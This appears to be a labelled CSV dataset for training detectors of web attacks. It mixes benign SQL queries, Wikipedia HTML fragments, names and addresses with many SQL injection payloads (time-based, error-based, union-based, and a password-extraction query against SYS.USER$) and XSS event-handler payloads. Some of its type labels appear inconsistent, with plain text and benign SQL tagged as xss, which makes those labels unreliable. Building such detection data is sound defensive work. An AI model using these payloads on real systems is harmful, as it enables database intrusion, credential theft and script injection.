Text,Label,type
"-8940""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""vnuo"" like ""vnuo",1,sql
"	 </span> <span class=""reference-text"">",0,xss
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",1,sql
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""ikaf"" like ""ikaf",1,sql
"   SELECT chapter,anything,which,airplane,main     (  (  orbit JOIN ran ON sister.purple =  first.friendly )   INNER JOIN heldON Orders.so =  process.anyID ) ",0,sql
SELECT * FROM town WHERE industrial = 'under'  AND City = 'mill',0,sql
SELECT * FROM tent WHERE struck BETWEEN 'transportation' AND 'include',0,sql
dukes,0,sql
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationstart=""alert(1)""></hgroup>",2,xss
<svg><a onload=alert(1)></a>,2,xss
"1""   )    )    as pqbs where 4409  =  4409",1,xss
 </p>,0,xss
"1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '",1,xss
"	 </span> <span class=""reference-text""><cite class=""citation news"">Brown, Noam; Sandholm, Tuomas (26 January 2018). <a rel=""nofollow"" class=""external text"" href=""http://science.sciencemag.org/content/359/6374/418"">""Superhuman AI for heads-up no-limit poker: Libratus beats top professionals"" </a>. <i>Science </i>. pp.&#160;418–424. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.aao1733"">10.1126/science.aao1733 </a><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0,xss
SELECT * FROM clear WHERE Price NOT BETWEEN 10 AND 20,0,sql
"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",1,sql
 </li>,0,xss
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,sql
"calle morse, 17",0,sql
rittenho,0,sql
SELECT alive ( s )  FROM usually SELECT exactly FROM arm,0,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,1,sql
general castaos 180 9-e,0,sql
15807509t,0,sql
"1'||  (  select 'ypil' from dual where 4568  =  4568 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",1,sql
"      <span class=""fa fa-book""> Read the Docs",0,xss
SELECT * FROM  ( SELECT powerful FROM everyone ) ,0,xss
"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",1,sql
asensio kuschel,0,sql
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,2,xss
"  SELECT Orders.enterrID, Employees.effect, Employees.why FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.appleID ORDER BY Orders.shelfID",0,sql
"<cite onmouseover=""alert(1)"">test</cite>",2,xss
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onanimationend=""alert(1)""></marquee>",2,xss
SELECT * FROM highest WHERE draw = 'lion'  OR son = 'contrast',0,sql
""" or """"*""",1,sql
1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,sql
"1'  )   as yuqv where 6007  =  6007 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,xss
SELECT belt,0,sql
SELECT * FROM double WHERE    NOT wheel = 'knew',0,sql
salustio,0,xss
"  SELECT * FROM giant WHERE obtain IN  ( 'truck', 'percent', 'dish' )  ",0,sql
exceptacin,0,sql
"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,1,sql
"	 </span> <span class=""toctext"">Advertising ",0,xss
"1' in boolean mode  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  #",1,xss
"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",1,xss
<rtc id=x tabindex=1 onactivate=alert(1)></rtc>,2,xss
"pl. quintero baez, 137",0,sql
"<canvas onkeydown=""alert(1)"" contenteditable>test</canvas>",2,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></li>",2,xss
 </li>,0,xss
"<summary onkeydown=""alert(1)"" contenteditable>test</summary>",2,xss
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,sql
	 </span> </h3>,0,xss
SELECT TOP 3 * FROM split SELECT * FROM explore 3SELECT * FROM tie,0,sql
-4157'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'rdhm'  =  'rdhm,1,sql
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c83dc379ef' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
1  )   as imdt where 6431  =  6431,1,sql
2.91012E+15,0,sql
SELECT * FROM reach WHERE definition BETWEEN '1996-07-01' AND '1996-07-31',0,sql
31439,0,sql
"<ul><li><a href=""/wiki/E-commerce"" title=""E-commerce"">E-commerce </a> </li>",0,xss
bizantina,0,xss
"	 <div class=""templatequotecite"">—&#8201;<cite><a href=""/wiki/Stephen_Hawking"" title=""Stephen Hawking"">Stephen Hawking </a><sup id=""cite_ref-367"" class=""reference""><a href=""#cite_note-367"">&#91;356&#93; </a> </sup> </cite> </div> </blockquote>",0,xss
SELECT go ( s )  FROM remarkable,0,sql
schnirer,0,xss
" </p><p>The use of AI machines in the market in applications such as online trading and decision making has changed major economic theories.<sup id=""cite_ref-323"" class=""reference""><a href=""#cite_note-323"">&#91;312&#93; </a> </sup> For example, AI based buying and selling platforms have changed the law of <a href=""/wiki/Supply_and_demand"" title=""Supply and demand"">supply and demand </a> in that it is now possible to easily estimate individualized demand and supply curves and thus individualized pricing. Furthermore, AI machines reduce <a href=""/wiki/Information_asymmetry"" title=""Information asymmetry"">information asymmetry </a> in the market and thus making markets more efficient while reducing the volume of trades<sup class=""noprint Inline-Template Template-Fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Citation_needed"" title=""Wikipedia:Citation needed""><span title=""This claim needs references to reliable sources. (July 2019)"">citation needed ",0,xss
"<style>@keyframes slidein {}</style><slot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></slot>",2,xss
select case when 2599  =  7035 then 1 else null end--,1,sql
"SELECT * FROM edge WHERE silver BETWEEN ""heard"" AND    ""tube""",0,sql
SELECT in ( s )  FROM missing SELECT deer FROM written,0,sql
SELECT ocean FROM ran,0,sql
1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,sql
"INSERT INTO change  ( rod, instead, tie )  VALUES  ( 'bring', 'magnet', 'copper' )  ",0,xss
 ,0,xss
<form onpointerenter=alert(1)>XSS</form>,2,xss
" </p><p>The study of non-learning <a href=""/wiki/Artificial_neural_network"" title=""Artificial neural network"">artificial neural networks </a><sup id=""cite_ref-Neural_networks_219-1"" class=""reference""><a href=""#cite_note-Neural_networks-219"">&#91;213&#93; </a> </sup> began in the decade before the field of AI research was founded, in the work of <a href=""/wiki/Walter_Pitts"" title=""Walter Pitts"">Walter Pitts </a> and <a href=""/wiki/Warren_McCullouch"" class=""mw-redirect"" title=""Warren McCullouch"">Warren McCullouch </a>. <a href=""/wiki/Frank_Rosenblatt"" title=""Frank Rosenblatt"">Frank Rosenblatt </a> invented the <a href=""/wiki/Perceptron"" title=""Perceptron"">perceptron </a>, a learning network with a single layer, similar to the old concept of <a href=""/wiki/Linear_regression"" title=""Linear regression"">linear regression </a>. Early pioneers also include <a href=""/wiki/Alexey_Grigorevich_Ivakhnenko"" class=""mw-redirect"" title=""Alexey Grigorevich Ivakhnenko"">Alexey Grigorevich Ivakhnenko </a>, <a href=""/wiki/Teuvo_Kohonen"" title=""Teuvo Kohonen"">Teuvo Kohonen </a>, <a href=""/wiki/Stephen_Grossberg"" title=""Stephen Grossberg"">Stephen Grossberg </a>, <a href=""/wiki/Kunihiko_Fukushima"" title=""Kunihiko Fukushima"">Kunihiko Fukushima </a>, <a href=""/wiki/Christoph_von_der_Malsburg"" title=""Christoph von der Malsburg"">Christoph von der Malsburg </a>, <a href=""/w/index.php?title=David_Willshaw&amp;action=edit&amp;redlink=1"" class=""new"" title=""David Willshaw (page does not exist)"">David Willshaw </a>, <a href=""/wiki/Shun-Ichi_Amari"" class=""mw-redirect"" title=""Shun-Ichi Amari"">Shun-Ichi Amari </a>, <a href=""/wiki/Bernard_Widrow"" title=""Bernard Widrow"">Bernard Widrow </a>, <a href=""/wiki/John_Hopfield"" title=""John Hopfield"">John Hopfield </a>, <a href=""/wiki/Eduardo_R._Caianiello"" title=""Eduardo R. Caianiello"">Eduardo R. Caianiello </a>, and others<sup class=""noprint Inline-Template Template-Fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Citation_needed"" title=""Wikipedia:Citation needed""><span title=""This claim needs references to reliable sources. (July 2019)"">citation needed ",0,xss
select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,1,sql
22193,0,sql
SHOW FULL COLUMNS FROM `wp_options`,0,sql
<rp onpointerout=alert(1)>XSS</rp>,2,xss
"1'||  (  select 'ycya' from dual where 3536  =  3536 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"plza. salamanca 39,",0,xss
arnal martagn,0,sql
"   SELECT Employees.report, COUNT ( Orders.withinID )  AS thingFROM    ( OrdersINNER JOIN cookies ON Orders.hunterID  =  Employees.shownID ) ",0,sql
"  SELECT PERIOD_ADD ( 201703, 5 ) ;",0,sql
"c/ meneses, 104 6-a",0,xss
SELECT * FROM  ( SELECT everybody FROM would ) ,0,xss
adams@11horas.ng,0,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'xmwj'  =  'xmwj",1,xss
"1'+  (  select 'bmit' where 3716  =  3716 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",1,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Transhumanism"" title=""Transhumanism"">Transhumanism </a> </div>",0,xss
"<li id=""cite_note-81""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-81"">^ </a> </b> ",0,xss
<spacer onpointerup=alert(1)>XSS</spacer>,2,xss
SELECT * FROM since WHERE roar NOT BETWEEN 'biggest' AND 'control',0,sql
"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym",1,sql
salter@quiromante.com.mg,0,sql
SELECT * FROM level WHERE replace LIKE '%worry%',0,sql
"<legend draggable=""true"" ondragleave=""alert(1)"">test</legend>",2,xss
"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",1,sql
<multicol id=x tabindex=1 onfocus=alert(1)></multicol>,2,xss
"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",1,xss
FROM  ( SELECT DISTINCT tongue FROM settle ) ,0,sql
"or 0  =  0 #""",1,sql
<content onpointerdown=alert(1)>XSS</content>,2,xss
SELECT COUNT ( my ) FROM wheel,0,sql
"1%"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1,sql
		 </h3>,0,xss
<multicol onpointerenter=alert(1)>XSS</multicol>,2,xss
SELECT AVG ( together ) FROM youth SELECT SUM ( tight ) ,0,xss
"<div draggable=""true"" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>",2,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,xss
"<object oncut=""alert(1)"" contenteditable>test</object>",2,xss
"ronda sant antoni maria claret 144,",0,sql
55119519l,0,sql
"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",1,sql
mclawhor,0,xss
SELECT * FROM  ( SELECT hand FROM situation ) ,0,xss
"<rtc onpaste=""alert(1)"" contenteditable>test</rtc>",2,xss
fasti-dio,0,sql
-9456%'   )    )     11)   order by 1#,1,sql
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",1,sql
SELECT doctor ( s )  FROM able UNION ALL,0,sql
SELECT * FROM rock FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM mother,0,xss
"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq",1,sql
"   SELECT Employees.surrounded, COUNT ( Orders.exclaimedID )  AS rushFROM    ( OrdersINNER JOIN accurate ON Orders.herselfID  =  Employees.sitID ) ",0,xss
"<li class=""toclevel-2 tocsection-37""><a href=""#Automotive""><span class=""tocnumber"">7.2 ",0,xss
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""regi"" like ""regi",1,sql
SELECT * FROM  ( SELECT soap FROM exactly ) ,0,sql
longo,0,xss
SELECT TOP 3 * FROM moving,0,sql
warhol@programagestionerp.ai,0,sql
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   --",1,sql
"1"" where 9083  =  9083 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,xss
SELECT dangerous ( s )  FROM grade UNION,0,xss
SELECT fairly ( s )  FROM creature FULL OUTER JOIN,0,xss
	 </span>,0,xss
SELECT * FROM tightly WHERE negative  BETWEEN 10 AND 20,0,sql
"	 </span> <span class=""toctext"">Strong AI hypothesis ",0,xss
"<figcaption onmousedown=""alert(1)"">test</figcaption>",2,xss
SELECT * FROM wp_posts WHERE ID  =  367808 LIMIT 1,0,sql
"-6017 union all select 8449,8449,8449--",1,sql
SELECT * FROM fly WHERE trace = 'rubbed',0,sql
-7378' or 6872  =  6872 and 'bnmn' like 'bnmn,1,sql
aguarn,0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=68"" title=""Edit section: Economics"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT * FROM nine,0,xss
"  SELECT truckID AS ID, article AS death FROM live",0,sql
"1%""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
SELECT * FROM tin ORDER BY minute DESC,0,sql
<svg><sup onload=alert(1)></sup>,2,xss
4az,0,sql
"   SELECT television, rule, surfaceFROM consonant WHERE hunt  IS NOT NULL",0,sql
"<div draggable=""true"" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>",2,xss
"castillo de malpica 119,",0,sql
"<code oncopy=""alert(1)"" contenteditable>test</code>",2,xss
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,1,xss
"   SELECT volume, motor+ ', ' + comfortable+ ' ' + dollar+ ', ' + plus AS cowboy  FROM could",0,sql
"<dl onmousemove=""alert(1)"">test</dl>",2,xss
SELECT TOP 3 * FROM idea,0,xss
panter,0,sql
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2636  ) ",0,sql
SELECT * FROM label WHERE whether = 'uncle' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_crm_oldversion_shortcodes' LIMIT 1,0,xss
SELECT already FROM heat UNION ALL SELECT hundred FROM again ORDER BY root,0,sql
"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",1,sql
0al5a4,0,sql
entregadora,0,xss
verschuer_greenleaf@cajucar.cx,0,xss
reencarnar,0,sql
3372,0,sql
strock,0,sql
"	<a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=9"" title=""Edit section: Natural language processing"">edit </a>",0,xss
"<form onmouseleave=""alert(1)"">test</form>",2,xss
gerola pugliesi,0,xss
